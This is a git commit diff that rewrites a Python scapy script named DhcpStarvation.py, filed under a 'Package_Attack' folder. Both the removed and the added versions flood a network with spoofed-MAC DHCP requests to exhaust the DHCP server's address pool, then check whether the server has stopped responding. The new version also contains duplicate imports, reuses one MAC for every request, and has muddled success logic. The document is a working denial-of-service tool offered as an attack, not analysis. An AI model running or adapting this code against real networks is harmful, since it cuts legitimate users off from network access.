866f578fb15f10cbb4f670ebafe07590f3753c30
BDEMAY0 <95568319+BDEMAY0@users.noreply.github.com>
2023-06-05 23:27:31 +0200

    BDM - Starvation v2

--- data/Package_Attack/DhcpStarvation.py
+++ data/Package_Attack/DhcpStarvation.py
@@ -1,1 +1,59 @@
-import randomfrom scapy.all import sendp, srp1, RandMAC, conffrom scapy.layers.l2 import Etherfrom scapy.layers.dhcp import DHCP, IP, BOOTPfrom scapy.layers.inet import UDPfrom concurrent.futures import ThreadPoolExecutorclass DhcpStarvation:    def __init__(self, interface, num_requests, num_threads):        self.interface = interface        self.num_requests = num_requests        self.num_threads = num_threads    # Envoie une demande DHCP avec une adresse MAC source aléatoire    def _send_request(self):        src_mac = RandMAC()        src_ip = "0.0.0.0"        dst_ip = "255.255.255.255"        ethernet = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")        ip = IP(src=src_ip, dst=dst_ip)        udp = UDP(sport=68, dport=67)        bootp = BOOTP(chaddr=src_mac, ciaddr=src_ip, xid=random.randint(1, 1000000), flags=0x8000)        dhcp = DHCP(options=[("message-type", "request"), "end"])        packet = ethernet / ip / udp / bootp / dhcp        sendp(packet, iface=self.interface, verbose=False)    # Exécute l'attaque DHCP Starvation en utilisant plusieurs threads pour envoyer les demandes DHCP    def run_attack(self):        conf.checkIPaddr = False        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:            for _ in range(self.num_requests):                executor.submit(self._send_request)    # Vérifie l'échec du DHCP après l'attaque    def check_dhcp_failure(self, timeout):        src_mac = RandMAC()        src_ip = "0.0.0.0"        dst_ip = "255.255.255.255"        ethernet = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")        ip = IP(src=src_ip, dst=dst_ip)        udp = UDP(sport=68, dport=67)        bootp = BOOTP(chaddr=src_mac, ciaddr=src_ip, xid=random.randint(1, 1000000))        dhcp = DHCP(options=[("message-type", "discover"), "end"])        packet = ethernet / ip / udp / bootp / dhcp        response = srp1(packet, iface=self.interface, timeout=timeout, verbose=False)        #Renvoie True si cela a marché         return response is not None
+from scapy.all import *
+from scapy.layers.dhcp import BOOTP, DHCP
+from scapy.layers.inet import IP, UDP
+from scapy.layers.l2 import Ether, ARP
+from scapy.all import sendp, RandMAC, conf
+from scapy.layers.l2 import Ether
+from scapy.layers.dhcp import DHCP, BOOTP, IP
+from scapy.layers.inet import UDP
+
+def dhcp_discover(spoofed_mac, i_face):
+    """
+    sending dhcp discover from the spoofed mac address (broadcast)
+
+    :param spoofed_mac: fake mac address
+    :param i_face: the systems network interface for the attack
+    """
+    ip_dest = '255.255.255.255'
+    mac_dest = "ff:ff:ff:ff:ff:ff"
+    dsc = Ether(src=mac2str(spoofed_mac), dst=mac_dest, type=0x0800)
+    dsc /= IP(src='0.0.0.0', dst=ip_dest)
+    dsc /= UDP(sport=68, dport=67)
+    dsc /= BOOTP(chaddr=mac2str(spoofed_mac),
+                 xid=random.randint(1, 1000000000),
+                 flags=0xFFFFFF)
+    dsc /= DHCP(options=[("message-type", "discover"),
+                         "end"])
+    sendp(dsc, iface=i_face)
+
+def test_initial_dhcp(spoofed_mac, i_face):
+    dhcp_discover(spoofed_mac=spoofed_mac, i_face=i_face)
+    p = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3)
+    return len(p) > 0
+
+def starve(target_ip=0, i_face=conf.iface, num_requests=1000):
+    cur_ip = 0
+    if target_ip:
+        server_mac = sr1(ARP(op=1, pdst=str(target_ip)))[0][ARP].hwsrc
+    mac = RandMAC()
+
+    # Test the initial DHCP request
+    if not test_initial_dhcp(spoofed_mac=mac, i_face=i_face):
+        return True
+
+    # Send many DHCP requests
+    for _ in range(num_requests):
+        dhcp_discover(spoofed_mac=mac, i_face=i_face)
+
+    # Test the final DHCP request
+    if not test_initial_dhcp(spoofed_mac=mac, i_face=i_face):
+        return False
+
+    return True
+
+def lancheur_starv(interface, num_requests_user):
+    success = starve(i_face=interface, num_requests=num_requests_user)
+    if success:
+        return False
+    else:
+        return True
